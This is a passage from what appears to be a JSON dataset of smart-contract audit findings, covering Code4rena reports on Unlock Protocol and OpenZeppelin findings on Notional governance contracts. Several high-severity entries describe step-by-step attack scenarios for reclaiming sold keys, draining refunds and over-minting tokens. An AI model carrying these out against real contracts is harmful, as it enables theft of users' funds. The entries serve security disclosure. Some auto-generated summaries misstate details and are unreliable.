(`_setKeyManagerOf(_tokenId, address(0));` is called but the key manager was already zero, which then does not clear approvals.)\n*   A' can claim back the token by calling `transferFrom(V, A', 42)` and the `onlyKeyManagerOrApproved(42)` modifier will pass as `approved[42] == A'` is still set.\n\n#### Recommended Mitigation Steps\n\nThe `_setKeyManagerOf` function should not handle clearing approvals of single-token approvals (`approved`) as these are two separate approval types.\nThe `transferFrom` function should always call `_clearApproval` in the `(previousExpiration <= block.timestamp)` case.\n\n**[julien51 (Unlock Protocol) confirmed and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/160#issuecomment-991687080):**\n > Thanks for reporting this.\n > This is valid and we will fix it.\n\n\n\n",
      "summary": "\nThis bug report details a vulnerability in the locks implementation of the MixinTransfer.transferFrom function, which requires any of the three approval types in the onlyKeyManagerOrApproved modifier on the tokenId to authenticate transfers from from. The bug is that if the to address previously had a key but it expired, only the _setKeyManagerOf call is performed, which does not clear approved if the key manager was already set to 0. This means that an attacker could sell someone a key, and then claim it back as the approvals are not always cleared. The recommended mitigation steps are for the _setKeyManagerOf function to not handle clearing approvals of single-token approvals, and for the transferFrom function to always call _clearApproval in the (previousExpiration <= block.timestamp) case.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/160",
      "tags": [
        "Approve",
        "Allowance"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1075",
      "title": "[H-03] MixinTransfer.sol#transferFrom Wrong implementation can potentially allows attackers to reverse transfer and cause fund loss to the users",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2021-11-unlock/blob/ec41eada1dd116bcccc5603ce342257584bec783/smart-contracts/contracts/mixins/MixinTransfer.sol#L131-L152\n\n```solidity\n    if (toKey.tokenId == 0) {\n      toKey.tokenId = _tokenId;\n      _recordOwner(_recipient, _tokenId);\n      // Clear any previous approvals\n      _clearApproval(_tokenId);\n    }\n\n    if (previousExpiration <= block.timestamp) {\n      // The recipient did not have a key, or had a key but it expired. The new expiration is the sender's key expiration\n      // An expired key is no longer a valid key, so the new tokenID is the sender's tokenID\n      toKey.expirationTimestamp = fromKey.expirationTimestamp;\n      toKey.tokenId = _tokenId;\n\n      // Reset the key Manager to the key owner\n      _setKeyManagerOf(_tokenId, address(0));\n\n      _recordOwner(_recipient, _tokenId);\n    } else {\n      // The recipient has a non expired key. We just add them the corresponding remaining time\n      // SafeSub is not required since the if confirms `previousExpiration - block.timestamp` cannot underflow\n      toKey.expirationTimestamp = fromKey.expirationTimestamp + previousExpiration - block.timestamp;\n    }\n```\n\nBased on the context, L131-136 seems to be the logic of handling the case of the recipient with no key, and L138-148 is handing the case of the recipient's key expired.\n\nHowever, in L131-136, the key manager is not being reset.\n\nThis allows attackers to keep the role of key manager after the transfer, and transfer the key back or to another recipient.\n\n### PoC\n\nGiven:\n\n- Alice owns a key that is valid until 1 year later.\n\n1. Alice calls `setKeyManagerOf()`, making herself the keyManager;\n2. Alice calls `transferFrom()`, transferring the key to Bob; Bob might have paid a certain amount of money to Alice upon receive of the key;\n3. Alice calls `transferFrom()` again, transferring the key back from Bob.\n\n### Recommendation\n\nConsider resetting the key manager regardless of the status of the recipient's key.",
      "summary": "\nThis bug report is about a vulnerability in the code of a smart contract called MixinTransfer.sol. The code in question is meant to handle the case of a recipient with no key, and the case of the recipient's key expiring. However, the key manager is not being reset in the code, which allows attackers to keep the role of key manager after the transfer. This could allow them to transfer the key back or to another recipient. A proof of concept is provided, where Alice transfers a key to Bob, and then transfers it back. The recommendation is to reset the key manager regardless of the status of the recipient's key.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/182",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1074",
      "title": "[H-02] Wrong design/implementation of freeTrial allows attacker to steal funds from the protocol",
      "impact": "HIGH",
      "content": "_Submitted by WatchPug_\n\nThe current design/implementation of `freeTrial` allows users to get full refund before the `freeTrial` ends. Plus, a user can transfer partial of their time to another user using `shareKey`.\n\nThis makes it possible for the attacker to steal from the protocol by transferring `freeTrial` time from multiple addresses to one address and adding up to `expirationDuration` and call refund to steal from the protocol.\n\n#### Proof of Concept\n\nGiven:\n\n*   `keyPrice` is 1 ETH;\n*   `expirationDuration` is 360 days;\n*   `freeTrialLength` is 31 days.\n\nThe attacker can create two wallet addresses: Alice and Bob.\n\n1.  Alice calls `purchase()`, transfer 30 days via `shareKey()` to Bob, then calls `cancelAndRefund()` to get full refund; Repeat 12 times;\n2.  Bob calls `cancelAndRefund()` and get 1 ETH.\n\n#### Recommendation\n\nConsider disabling `cancelAndRefund()` for users who transferred time to another user.\n\n**[julien51 (Unlock Protocol) confirmed and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/188#issuecomment-979656014):**\n > I think this is valid! The free trial approach is indeed a risk on that front and we need to \"warn\" lock managers about this more.\n >\n > For lock manager who still want to offer free trials, the best approach would probably be to set a high transfer fee to make sure that free trials cannot be transfered.\n >\n > As a consequence of this, I am not sure this is as critical as indicated by the submitter.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/188#issuecomment-1013831268):**\n > Nice find!\n> \n> From what I can tell at least, this does seem like a viable attack vector. Can I ask why this should not be treated as `high` risk? @julien51 \n\n**[julien51 (Unlock Protocol) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/188#issuecomment-1068786053):**\n > Sorry for the long delay here.\n > In short: this is valid, but only an issue for locks which are enabling free trials (no one has done it) and we would make sure our UI shows this as a potential issue.\n > In other words: a lock manager would need to _explicitly_ enable free trials, despite our warning to put their own funds at risk. For that reason I don't think this is \"High\".\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/188#issuecomment-1075667239):**\n > While this is a valid issue pertaining only to lock managers who _explicitly_ enable free trials, this may still lead to a loss of funds if `cancelAndRefund` is called by a user who has transferred their time to another account. I still believe this deserves a `high` severity rating.\n >\n > In my honest opinion, a warning isn't sufficient to prevent such abuse. I think on-chain enforcement ideal in this situation.\n\n\n\n",
      "summary": "\nThis bug report is about WatchPug, a protocol that allows users to get a free trial. The current design/implementation of the freeTrial allows users to get a full refund before the freeTrial ends. Additionally, a user can transfer part of their time to another user using the `shareKey` function. This makes it possible for an attacker to steal from the protocol by transferring freeTrial time from multiple addresses to one address, adding up to the `expirationDuration`, and calling a refund to steal from the protocol.\n\nA proof-of-concept (PoC) was provided to demonstrate the vulnerability. It assumes that the `keyPrice` is 1 ETH, the `expirationDuration` is 360 days, and the `freeTrialLength` is 31 days. The PoC outlines how the attacker could create two wallet addresses (Alice and Bob). Alice would call `purchase()`, transfer 30 days via `shareKey()` to Bob, then call `cancelAndRefund()` to get a full refund. This process would be repeated 12 times. Bob would then call `cancelAndRefund()` and get 1 ETH.\n\nThe bug report recommends disabling `cancelAndRefund()` for users who transferred time to another user, which would prevent the attack outlined in the PoC.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/188",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1073",
      "title": "[H-01] MEV miner can mint larger than expected UDT total supply",
      "impact": "HIGH",
      "content": "_Submitted by elprofesor_\n\n`UnlockProtocol` attempts to calculate gas reimbursement using `tx.gasprice`, typically users who falsify `tx.gasprice `would lose gas to miners and therefore not obtain any advantage over the protocol itself. This does present capabilities for miners to extract value, as they can submit their own transactions, or cooperate with a malicious user, reimbursing a portion (or all) or the `tx.gasprice` used. As the following calculation is made;\n\n        uint tokensToDistribute = (estimatedGasForPurchase * tx.gasprice) * (125 * 10 ** 18) / 100 / udtPrice;\n\nwe can see that arbitrary `tx.gasprices` can rapidly inflate the `tokensToDistribute`. Though capped at maxTokens, this value can be up to half the total supply of UDT, which could dramatically affect the value of UDT potentially leading to lucrative value extractions outside of the pool.\n\n#### Recommended Mitigation Steps\n\nUsing an oracle service to determine the average gas price and ensuring it is within some normal bounds that has not been subjected to arbitrary value manipulation.\n\n**[julien51 (Unlock Protocol) disputed and commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/135#issuecomment-991699670):**\n > > we can see that arbitrary tx.gasprices can rapidly inflate the tokensToDistribute. Though capped at maxTokens, this value can be up to half the total supply of UDT, which could dramatically affect the value of UDT potentially leading to lucrative value extractions outside of the pool.\n> \n> As you noted it would be capped by the actual increase of the GDP transaction.\n> \n> However we could indeed use an oracle to determine the average gas price over a certain number of blocks to limit the risk even further. \n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/135#issuecomment-1009512489):**\n > I think the warden has raised a valid issue of value extractions. Whether the value extracted is capped at a certain number of tokens, I don't think the issue is nullified as a result. Miners can realistically fill up blockspace by abusing this behaviour and then selling netted tokens on the open market. I'll consider marking this as `medium`, what do you think @julien51 ?\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/135#issuecomment-1009577434):**\n > I think `maxTokens` will be set to `IMintableERC20(udt).totalSupply() / 2` upon the first call to `recordKeyPurchase()`. If I'm not mistaken, this could allow a malicious miner could effectively distribute half of the token supply in one tx.\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2021-11-unlock-findings/issues/135#issuecomment-1013810733):**\n > After further offline discussions with @julien51. We agree that this is an issue that needs to be addressed.\n> \n> If we consider real-world values for `IMintableERC20(udt).totalSupply()` and `IMintableERC20(udt).totalSupply()` as `1_000_000e18` and `400e18` respectively. Then a miner could mint up to ~1247 `UDT` tokens valued at \\$USD 124,688 if they provide a single Ether as their purchase amount. Obviously this can be abused to generate a huge amount of profit for miners, so as this is a viable way to extract value from the protocol, I will be keeping this as `high` severity.\n\n\n\n",
      "summary": "\nThis bug report is about the vulnerability of the Unlock Protocol. It is a protocol that attempts to calculate gas reimbursement using tx.gasprice. However, malicious users can falsify tx.gasprice, which would cause them to lose gas to miners and not obtain any advantage over the protocol. This could lead to miners extracting value from the protocol. The calculation that is made can rapidly inflate the tokensToDistribute, which could affect the value of UDT. The recommended mitigation steps include using an oracle service to determine the average gas price and ensuring it is within some normal bounds that has not been subjected to arbitrary value manipulation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Unlock Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-unlock",
      "github_link": "https://github.com/code-423n4/2021-11-unlock-findings/issues/135",
      "tags": [],
      "finders": [
        "elprofesor"
      ]
    },
    {
      "id": "10772",
      "title": "[L12] Unnecessary return statements",
      "impact": "LOW",
      "content": "The [`delegate`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L184) and [`delegateBySig`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L213) functions use `return` when calling the `_delegate` function. However, because the [`_delegate` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L287) does not return any output, these return statements are needless.\n\n\nTo avoid confusion and improve the code’s readability, consider removing the unnecessary `return` statements from the code.\n\n\n***Update:** Fixed in [pull request 28](https://github.com/notional-finance/contracts-v2/pull/28/files).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10771",
      "title": "[L11] Proposal execution not handling returned data",
      "impact": "LOW",
      "content": "The [`executeProposal` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L273-L295) from the `GovernorAlpha` contract allows any user to execute a proposal from the timelock queue once the delay has passed. This is accomplished through the [`executeBatch` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L304) from [OpenZeppelin’s `TimelockController` contract](https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController).\n\n\nCurrently the `executeBatch` function does not handle data returned by executed transactions. Although OpenZeppelin plans to implement this soon in the `TimelockController` contract, consider extending the functionality in order to handle return data from the proposals’ execution.\n\n\n***Update:** Acknowledged. Notional’s statement for this issue:*\n\n\n\n> \n> *Won’t fix, will use the OZ implementation when it is ready. It’s not clear how a set of governance proposals will actually use return data during a batch of transaction executions.*\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10770",
      "title": "[L10] Re-implementing ECDSA signature recovery",
      "impact": "LOW",
      "content": "The [`castVoteBySig` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L386) from the `GovernorAlpha` contract and the [`delegateBySig` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L195) from the `NoteERC20` contract include an implementation of the ECDSA signature recovery function. This function is already part of the OpenZeppelin contracts, which has been audited and is constantly reviewed by the community.\n\n\nConsider importing and using the `recover` function from [OpenZeppelin’s ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0-solc-0.7/contracts/cryptography/ECDSA.sol) not only to benefit from bug fixes to be applied in future releases, but also to reduce the code’s attack surface.\n\n\n***Update:** Fixed in [pull request 28](https://github.com/notional-finance/contracts-v2/pull/28/files). However, because the OpenZeppelin’s `ECDSA` library already [checks if the outcome is the zero address](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0-solc-0.7/contracts/cryptography/ECDSA.sol#L68), the same [validation from the `GovernorAlpha` contract](https://github.com/notional-finance/contracts-v2/pull/28/files#diff-bcad43098e6b2e158146063db929d96c4d353b0274021f2acaeba215fdc1d9e9R401) is redundant. Consider removing it. The same note applies to the [respective case in the `NoteERC20` contract](https://github.com/notional-finance/contracts-v2/pull/28/files#diff-35f1aa28e9e058e54000cbccd5d5221db80e1504435b27bb76531ee1ca9c3df7R211).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10769",
      "title": "[L09] Proposals never reach the Queued state",
      "impact": "LOW",
      "content": "The [`state` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L342) from the `GovernorAlpha` contract is used to return the current state of any proposal. The possible states are stored in the [`ProposalState` enum](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L73) and the [`proposals` mapping](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L76) contains a record of all proposals data in any state.\n\n\nDue to the logic used for [determining the `Succeeded` state](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L360-L365), a queued proposal will never be able to reach the `Queued` state, even after the [`queueProposal`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L244) function has been called.\n\n\nAlthough the `state` function is not currently used to determine whether a proposal is `Queued` or not, changes to this, other contracts, or any other project that rely on the `ProposalState` being `Queued` may be vulnerable to future attacks. Consider revising the way the `state` function identifies a proposal as `Queued` and warning users about this behavior.\n\n\n***Update:** Fixed in [pull request 31](https://github.com/notional-finance/contracts-v2/pull/31/files). The `state` function now validates if the proposal is queued by checking if it is still pending.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10768",
      "title": "[L08] Transfer of ERC20 tokens do not use SafeERC20",
      "impact": "LOW",
      "content": "The [`drip` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L51) from the `Reservoir` contract transfers a fix-rate of ERC-20 tokens to a target address based on its [deployment parameters](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L41-L45). The `transfer` call used is then [checked for success](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L63-L64). However, some ERC-20 compliant tokens may not return a boolean.\n\n\nTo handle a broader variety of tokens, consider using the [`safeTransfer` method from the OpenZeppelin’s `SafeERC20` library](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#SafeERC20) as an alternative.\n\n\n***Update:** Acknowledged, and will not fix. Notional’s statement for this issue:*\n\n\n\n> \n> *Won’t fix, there’s no intention of expanding the use case beyond NOTE tokens*\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10767",
      "title": "[L07] Not using SafeMath functions",
      "impact": "LOW",
      "content": "Although several parts of the codebase employs its custom SafeMath methods where appropriate, there are still a few instances of regular Solidity arithmetic operators being used. Some examples are:\n\n\n* On [line 191 of `GovernorAlpha.sol`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L191) a `+` is used.\n* On [line 56 of `Reservoir.sol`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L56) a `-` is used.\n* On [line 221 of `NoteERC20.sol`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L221) a `-` is used.\n* On [line 244 of `NoteERC20.sol`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L244) a `-` is used.\n* On [line 245 of `NoteERC20.sol`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L245) a `-` is used.\n* On [line 254 of `NoteERC20.sol`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L254) a `-` is used.\n* On [line 361 of `NoteERC20.sol`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L361) a `-` is used.\n* On [line 365 of `NoteERC20.sol`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L365) a `+` is used.\n\n\nAlthough these cases do not represent a security risk per se, consider always performing arithmetic operations with methods that protect the system from such possibilities, like the [math libraries of OpenZeppelin contracts](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/math).\n\n\n***Update:** Acknowledged, and will not fix. Notional’s statement for this issue:*\n\n\n\n> \n> *Won’t fix, overflow in any of these cases is highly unlikely*\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10766",
      "title": "[L06] Missing and / or incomplete docstrings",
      "impact": "LOW",
      "content": "Some contracts and functions in the code base lack documentation or include incomplete descriptions. This hinders reviewers’ understanding of the code’s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned, and the events emitted. Below we list all instances detected during the audit.\n\n\nIn the `Constants` library:\n\n\n* Several constants lack their documentation stating its purpose and the reason of its value, such as the [`FCASH_ASSET_TYPE` constant](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/global/Constants.sol#L64).\n\n\nIn the `GovernorAlpha` contract:\n\n\n* The [`getReceipt` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L332-L337) is missing a docstring for the `return` value.\n* The [`state` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L341) contains an incomplete docstring for the `return` value.\n* The [`updateQuorumVotes` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L432-L436) is missing all its documentation.\n* The [`updateProposalThreshold` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L438-L442) is missing all its documentation.\n* The [`updateVotingDelayBlocks` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L444-L448) is missing all its documentation.\n* The [`updateVotingPeriodBlocks` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L450-L454) is missing all its documentation.\n* The [`constructor` function](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L126) is missing all its documentation.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).\n\n\n***Update:** Partially fixed in [pull request 27](https://github.com/notional-finance/contracts-v2/pull/27/files). No documentation has been added to the `Constants` library, such as on the [`FCASH_ASSET_TYPE` constant](https://github.com/notional-finance/contracts-v2/blob/d17291485837134d066558a7bec78220bb634976/contracts/global/Constants.sol#L64).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10765",
      "title": "[L05] Lack of input validation",
      "impact": "LOW",
      "content": "Several `external` functions fail to validate the input parameters supplied. For example:\n\n\n* The [initialization of the `Reservoir` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L41-L45) completely lacks input validation, such as validating whether the [`token_` address](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L43) corresponds to a real contract and whether the [`dripRate_` value](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L42) is greater than zero.\n* The [`notionalProxy_` address](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/NoteERC20.sol#L90) from the `NoteERC20` contract does not check if that address corresponds to a contract’s address.\n* The [`constructor` function from the `GovernorAlpha` contract](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L126-L146) does not check if the [`note_` address](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L139) corresponds to a contract’s address. Moreover, the [`quorumVotes_`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L135), the [`proposalThreshold_`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L136), the [`votingDelayBlocks_`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L137), and the [`votingPeriodBlocks_`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L138) values are not being check in any sense, which could result in the ability to vote a proposal without the need of voting power, the inability to vote a proposal if the voting period is zero, or the inability to pass a proposal due to a shortage of needed voting power, among other outcomes.\n* Similarly, in the `GovernorAlpha` contract, the [`updateQuorumVotes`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L432), the [`updateProposalThreshold`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L438), the [`updateVotingDelayBlocks`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L444), and the [`updateVotingPeriodBlocks`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L450) functions lack of input validation, which may cause the outcomes mentioned above.\n\n\nTo avoid errors and unexpected system behavior, consider explicitly restricting the range of inputs that can be accepted for all externally-provided inputs via `require` clauses where appropriate. For all cases of contract’s addresses, consider using the [OpenZeppelin’s `Address` library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0-solc-0.7/contracts/utils/Address.sol#L8) to check that the input address corresponds to a contract’s address.\n\n\n***Update:** Partially fixed in [pull request 32](https://github.com/notional-finance/contracts-v2/pull/32/files). Some of the protocol’s parameters are still not checked against a zero value. Furthermore, the code does not enforce validation over the voting period [due to conflicts with the tests](https://github.com/notional-finance/contracts-v2/pull/32/files#diff-bcad43098e6b2e158146063db929d96c4d353b0274021f2acaeba215fdc1d9e9R145). Notional’s statement for this issue:*\n\n\n\n> \n> *No validation is done for quorumVotes, proposalThreshold and votingDelayBlocks because it is not clear what values would be reasonable minimums or maximums there.*\n> \n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10764",
      "title": "[L04] Misleading comments",
      "impact": "LOW",
      "content": "Throughout the codebase there are cases of misleading or inaccurate documentation. Some examples are:\n\n\n* The description of the `dripRate_` parameter for the [`Reservoir` `constructor`](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L33) claims to be “tokens per block”, but the implementation is actually “tokens per second” as described in the [`DRIP_RATE` variable](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/Reservoir.sol#L20-L21).\n* The documentation for the [`quorumVotes` parameter](https://github.com/notional-finance/contracts-v2/blob/c37c89c9729b830637558a09b6f22fc6a735da64/contracts/external/governance/GovernorAlpha.sol#L23) state that “for a vote to succeed” although it should be either “for a voting process to succeed” or “for a proposal to succeed”.\n\n\nConsider fixing these and all misleading comments in the codebase to improve the code’s readability.\n\n\n***Update:** Fixed in [pull request 27](https://github.com/notional-finance/contracts-v2/pull/27/files).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Notional Governance Contracts v2 Audit",
      "source_link": "https://blog.openzeppelin.com/notional-v2-audit-governance-contracts/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
